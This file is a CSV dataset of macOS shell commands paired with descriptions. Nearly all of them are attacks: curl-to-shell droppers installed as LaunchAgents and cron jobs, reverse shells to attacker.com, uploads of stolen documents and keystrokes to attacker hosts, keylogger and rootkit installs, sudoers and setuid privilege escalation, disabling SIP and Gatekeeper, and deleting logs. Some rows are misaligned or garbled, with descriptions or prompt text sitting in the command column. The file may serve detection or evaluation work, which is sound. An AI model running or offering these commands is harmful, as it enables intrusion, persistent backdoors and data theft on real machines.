"cmd","description"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.dropper</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/dropper.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.dropper.plist && launchctl load ~/Library/LaunchAgents/com.malicious.dropper.plist","Persistence via malicious plist file to execute a dropper script every 5 minutes."
"sudo tcpdump -i en0 -w ~/Desktop/captured_packets.pcap","Capturing network packets and analyzing traffic for sensitive information on a macOS system."
"*/5 * * * * sudo spctl --master-disable","Persistence through a cron job that disables macOS Gatekeeper allowing unsigned code to run every 5 minutes."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3...' >> ~/.ssh/authorized_keys","Persistence mechanism by adding an SSH key to the authorized_keys for silent access."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfl9Mw81EY82eQp1R3LC0Kk2UQHdZm4eU9GkzZ6EPT5EDyH9L7J3X8Hkv8J4KgX4FjTbXxqEz8roGsGjx+qG3TQv8gkKFS8s6M4TPT4vz0YqyGf6JmG/4Ch5S9qC2sMj9lWgA0TISpHdNbzyQgzwNtX+5l9HH5Td1rVz485vjkk3MgG4c9kY3vgVG68HIdzw4w5iJl3s1HxLJ+zQ7p3t5tMzxE3z5iCkmuZJ3yUqVp9P+5fXq5sMJRKeL5H3PYyW9MdKPqBmJ3lLb9L2R5r8GGH2ZLJh9L1tUpUJ8dsS3zVLAVcPHp4pvx+J6S1ZxJw0xFDZxMnW2sdbMzHJ5cdx9 unauthorized_key' >> ~/.ssh/authorized_keys","Establishing unauthorized remote access by appending malicious SSH keys to the authorized_keys file."
"curl -s http://example.com/malicious-install.sh | sh","Malware installation using a disguised script from a remote server."
"mkdir /usr/local/.hidden && curl -o /usr/local/.hidden/.rootkit http://example.com/rootkit && chmod +x /usr/local/.hidden/.rootkit && /usr/local/.hidden/.rootkit","Rootkit embedding through a hidden directory and file."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious-command</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > /Library/LaunchDaemons/com.malicious.daemon.plist && launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Establishing boot persistence with a Launch Daemon."
"curl -o firmware-flasher http://example.com/firmware-flasher && chmod +x firmware-flasher && ./firmware-flasher --flash /path/to/malicious-firmware.bin","UEFI firmware modifications using a third-party flashing tool."
"launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence mechanism through LaunchAgents by loading a malicious property list file."
"rar a -pYourPassword -v10m -m5 sensitive_files.rar /path/to/sensitive/documents/*","Compressing sensitive documents into a password-protected split archive using rar on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.remote.access</string>
	<key>ProgramArguments</key>
	<array>
		<string>bash</string>
		<string>-c</string>
		<string>curl -s http://attacker.com/modrewrite_exploit.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.remote.access.plist && launchctl load ~/Library/LaunchAgents/com.remote.access.plist","Persistence via malicious plist to maintain remote access by exploiting mod_rewrite vulnerabilities in Apache servers."
"ps aux","Enumeration of all running processes on a macOS system to identify potential targets for exploitation."
"while :; do yes > /dev/null & done","Inducing system resource exhaustion by spawning multiple instances of a command that consumes CPU resources."
"leak() { while true; do dd if=/dev/zero bs=1m | gzip | gzip -d > /dev/null & done }; leak","Simulating a memory leak on macOS by allocating memory without releasing it."
"echo 'ssh-rsa AAAAB3Nza... attacker@malicious.com' >> ~/.ssh/authorized_keys","Persistence by adding a malicious SSH key to the authorized_keys file to maintain remote access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/python</string>
		<string>/Users/Shared/keylogger.py</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to log keystrokes."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh &","Remote access tool configuration using bash script."
"curl -o ~/Library/Scripts/keylogger.sh http://malicious-url.com/keylogger.sh && chmod +x ~/Library/Scripts/keylogger.sh && ~/Library/Scripts/keylogger.sh","Keylogger installation via curl and execution."
"sudo fs_usage | grep 'WRONLY' | grep '/Volumes/'","Detecting unauthorized file copies by monitoring write operations to external drives."
"echo 'while true; do curl http://malicious-url.com/script.sh | bash; sleep 300; done' > ~/.hidden_script && chmod +x ~/.hidden_script && echo 'launchctl load -w /System/Library/LaunchDaemons/com.hidden.script.plist' >> ~/.bash_profile","A scenario where a hidden file in a user's home directory is used to persistently run a malicious script at system startup."
"zip -r /tmp/sensitive_data.zip ~/Documents/sensitive/* && sshpass -p 'password' scp /tmp/sensitive_data.zip user@remote-server.com:/path/to/store","Compressing sensitive files in the Documents directory and exfiltrating them to a remote server using scp with password authentication."
"log stream --predicate 'eventMessage contains ""keystroke""' > /tmp/keystroke.log","Data exfiltration through keylogging on macOS systems."
"nohup ./hidden_process &","Stealthy launch of a process on a macOS system."
"mv malicious_program /usr/local/bin/legitimate_process && /usr/local/bin/legitimate_process","Process masquerading to evade detection on macOS."
"crontab -l | { cat; echo ""* * * * * osascript -e 'do shell script \""launchctl load /Library/LaunchDaemons/com.malicious.plist\"" with administrator privileges'""; } | crontab -","Injecting code into an existing cron job to achieve persistence with privilege escalation on a macOS system."
"mkdir -p ~/Library/LaunchAgents && echo '{""Label"":""com.hidden.agent"",""RunAtLoad"":true,""ProgramArguments"":[""/usr/bin/osascript"",""-e"",""do shell script \""/path/to/malicious/script.sh\"" with administrator privileges""]}' > ~/Library/LaunchAgents/com.hidden.agent.plist && launchctl load ~/Library/LaunchAgents/com.hidden.agent.plist","Persistence mechanism using a hidden Launch Agent to execute a script at user login"
"curl -s http://phishing-domain.com/malware_installer.sh | sh","Malware installation via a disguised script downloaded from a phishing email."
"grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}' /path/to/database/files/* > extracted_emails.txt","Extracting email addresses from the local database files for a phishing campaign."
"sqlite3 ~/Library/Application\ Support/AddressBook/AddressBook-v22.abcddb 'SELECT ZFIRSTNAME, ZLASTNAME, ZEMAIL FROM ZABCDEMAILADDRESS;' > contacts_for_phishing.csv","Querying system databases to gather contact information for targeted phishing."
"Capturing keystrokes to obtain passphrases and exfiltrating data via encrypted email from a macOS system.","A scenario where confidential information is exfiltrated from a macOS system by capturing keystrokes to obtain passphrases and then emailing the information out using an encrypted email content."
"osascript -e 'tell application ""System Events"" to keystroke ""curl --upload-file ~/Documents/confidential.txt --user user:passphrase --ssl-reqd smtp://smtp.example.com:465/""'","Provide the code snippet for the described scenario."
"zip --password SECRET archive.zip sensitive.doc && curl --upload-file ./archive.zip ftp://attacker.com/uploads/","Encrypting documents before exfiltration to a remote server."
"exiftool -all= *.jpg && tar -czf images.tar.gz *.jpg && nc -w 3 attacker.com 1234 < images.tar.gz","Scrubbing metadata from image files before sending them."
"find ~/Documents -type f -name '*.pdf' -exec gpg --encrypt --recipient 'user@example.com' {} \; && tar -czf encrypted-docs.tar.gz ~/Documents/*.gpg && curl --upload-file ./encrypted-docs.tar.gz ftp://attacker.com/documents/","Automating the collection and transmission of documents from a directory."
"*/5 * * * * curl -fsSL http://malicious-url.com/payload.sh | sh","Persistence mechanism using a cron job to execute a script hosted on a remote server every 5 minutes."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious_payload</string>
		<string>http://malicious-url.com/payload</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","A launch daemon that persists on the system and executes a downloaded malicious payload on system startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>system_profiler SPHardwareDataType | curl -d @- http://malicious-url.com/report</string>
	</array>
	<key>StartInterval</key>
	<integer>3600</integer>
</dict>
</plist>' | tee ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Malware launch agent that sends system information to a remote server at regular intervals."
"zip -r encrypted_files.zip ~/Documents/SensitiveData -e","Compressing sensitive files before exfiltration."
"cat image.jpg encrypted_files.zip > hidden.jpg","Hiding compressed files in image metadata."
"steghide embed -cf picture.jpg -ef secret.txt","Using steganography tools to conceal data within an image."
"osascript -e 'do shell script ""chown root:wheel /path/to/unsigned_driver.kext && chmod -R 755 /path/to/unsigned_driver.kext && kextload /path/to/unsigned_driver.kext"" with administrator privileges'","Privilege escalation by exploiting a kernel vulnerability through the use of an unsigned driver to modify kernel extensions."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to maintain a keylogger on the system."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via login item modification using AppleScript to add a malicious application to user login items."
"*/30 * * * * osascript -e 'tell application ""System Events"" to keystroke ""d"" using {command down, shift down}' && zip -r ~/Documents.zip ~/Documents && curl --silent --output /dev/null --data-binary @~/Documents.zip http://trusted-app.com/upload","Persistence via cron job to exfiltrate documents while evading network monitoring."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence mechanism using a malicious Launch Agent to execute a script at login"
"find / -mmin -5 -type f -exec stat -f '%m%t%Sm %N' {} \;","Identifying unauthorized changes to file access timestamps in the system logs."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to execute a keylogger at login"
"curl -o ~/Library/RAT http://unauthorized-url.com/remote_access_tool && chmod +x ~/Library/RAT && ~/Library/RAT","Downloading a remote access tool from an unauthorized URL"
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Establishing a reverse shell to maintain access"
"echo 'Ciphers aes128-cbc,3des-cbc' >> /etc/ssh/sshd_config && launchctl stop com.openssh.sshd && launchctl start com.openssh.sshd","Modifying the SSH configuration to use weak ciphers for establishing connections."
"while true; do cat /dev/null > ~/.keystroke_log; sudo opensnoop -v | grep -i 'keystrokes' >> ~/.keystroke_log & done","Tracking user activities by persistently logging keystrokes using a hidden process."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/local/bin/malicious_script.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via a malicious Launch Agent that executes a script every time the user logs in."
"*/5 * * * * curl -fsSL http://malicious-url.com/payload.sh | bash","Persistence mechanism using a cron job to execute a script from a remote server every 5 minutes on a macOS system."
"echo 'int main() { char large_string[128]; for (int i = 0; i < 300; i++) large_string[i] = 'A'; system(""/usr/bin/vulnerable_service""); return 0;}' > exploit.c && gcc -o exploit exploit.c && ./exploit","Privilege escalation by exploiting buffer overflow vulnerability in a macOS system service."
"Appending a malicious host key to the known_hosts file to redirect the SSH connection.","A scenario where an attacker manipulates the known_hosts file to redirect SSH connections to a malicious server."
"echo 'malicious-server.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7' >> ~/.ssh/known_hosts","What would be the shell command to achieve this known_hosts file manipulation?"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell on system startup."
"curl -s http://compromised-website.com/adscript.sh > /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh","Malware installation via a disguised Bash script downloaded from a pop-up advertisement on a compromised website."
"DYLD_INSERT_LIBRARIES=/path/to/malicious_library.dylib /usr/bin/sudo","Injecting code into privileged processes through dynamic library loading."
"echo 'export DYLD_LIBRARY_PATH=/malicious/directory' >> ~/.bash_profile && source ~/.bash_profile","Gaining higher privileges by hijacking dylib loading."
"find / -name '*.dylib' -mtime -1","Monitoring for suspicious dynamic library activity."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.extension</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/kextload</string>
		<string>/Library/Extensions/malicious.kext</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > /Library/LaunchDaemons/com.malicious.extension.plist && launchctl load /Library/LaunchDaemons/com.malicious.extension.plist && csrutil disable","Persistence via malicious plist to load a kernel extension without system integrity protection."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations where the sudoers file is writable by a group."
"cp /bin/sh /tmp/privileged_sh && chmod +s /tmp/privileged_sh","Privilege escalation by exploiting a vulnerable setuid application on macOS."
"echo '/tmp/hijack_library.so' > /etc/ld.so.preload","Hijacking library paths to gain higher privileges using setuid binaries."
"TF=$(mktemp) && echo 'int main() { setuid(0); system(""/bin/bash""); return 0; }' > $TF.c && gcc $TF.c -o $TF && chmod +s $TF && $TF","Abusing setuid binaries to execute arbitrary code with elevated privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.keylogger</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-o</string><string>/tmp/.keylogger</string><string>http://malicious-url.com/keylogger</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>300</integer></dict></plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to establish a keylogger with remote control capabilities."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.ransomware</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/ransomware</string>
		<string>http://malicious-url.com/ransomware</string>
		<string>&&</string>
		<string>chmod</string>
		<string>+x</string>
		<string>/tmp/ransomware</string>
		<string>&&</string>
		<string>/tmp/ransomware</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.ransomware.plist && launchctl load ~/Library/LaunchAgents/com.malicious.ransomware.plist","Persistence via malicious plist to run ransomware at system startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-X</string>
		<string>POST</string>
		<string>--data-binary</string>
		<string>@/tmp/keystrokes.log</string>
		<string>http://attacker.com/collect</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist && echo 'while [ true ]; do logKext=`kextstat | grep com.malicious.keylogger` && if [ ""$logKext"" != """" ]; then curl -X POST --data-binary @/tmp/keystrokes.log http://attacker.com/collect; fi; sleep 300; done' > ~/.keylogger.sh && chmod +x ~/.keylogger.sh && nohup ~/.keylogger.sh &","Persistence via malicious plist to establish a keylogger that sends data to a remote server."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script from a remote server."
"sudo bash -c 'curl -s http://malicious-url.com/rootkit -o /usr/local/bin/rootkit && chmod +x /usr/local/bin/rootkit && /usr/local/bin/rootkit'","Rootkit embedding into the system with elevated privileges."
"echo 'sudo nohup /path/to/malicious/app &' >> ~/.bash_profile","Achieving boot persistence for a malicious application."
"csrutil disable && mount -uw / && mv /path/to/malicious_file /System/Library/LaunchDaemons/","Bypassing System Integrity Protection to modify protected system files."
"curl -o ~/Library/LaunchAgents/com.malicious.plist http://malicious-url.com/malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file that executes a downloaded payload."
"cat /var/log/auth.log | grep 'sshd' > ~/Desktop/ssh_login_attempts.txt","Tracking user authentication events via unauthorized access to the auth.log file."
"osascript -e 'do shell script ""echo malware >> /etc/sudoers"" with administrator privileges'","Injecting code into a privileged process on macOS to escalate privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.loginitem</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/local/bin/malicious_script.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.loginitem.plist && launchctl load ~/Library/LaunchAgents/com.malicious.loginitem.plist","Persistence via malicious plist in LaunchAgents to execute a script every login."
"curl -s http://malicious-url.com/installer.sh | sh","Malware installation using a disguised script downloaded from a remote server."
"curl -s -o ~/.hidden http://malicious-url.com/rootkit && chmod +x ~/.hidden && ~/.hidden","Rootkit embedding into the system by executing a hidden binary."
"sudo kextload /tmp/malicious.kext","Kernel module injection using a malicious loadable kernel module."
"sudo nvram boot-args=""kext-dev-mode=1""","Disabling secure kernel extension loading to allow unsigned kexts."
"chmod 4777 /bin/bash","A scenario where file permissions are manipulated to escalate privileges on a macOS system."
"chmod 600 /var/log/*","A method to alter system logs permissions to hide malicious activity."
"for log in /var/log/*; do chmod 600 ""$log""; done","A script to automate the process of changing log permissions."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations that allow executing commands without a password."
"sudo chmod 777 /var/log/system.log","Altering system logs permissions to gain unauthorized access and modify logs."
"sudo rm -rf /var/log/*","Deleting system logs to cover tracks after gaining elevated privileges."
"osascript -e 'display notification ""Urgent software update required"" with title ""System Update""' && curl -s -o ~/Downloads/Update.pkg http://malicious-url.com/fake-update.pkg && open ~/Downloads/Update.pkg","Malware installation through a fake software update notification script that deceives the user into downloading a malicious package."
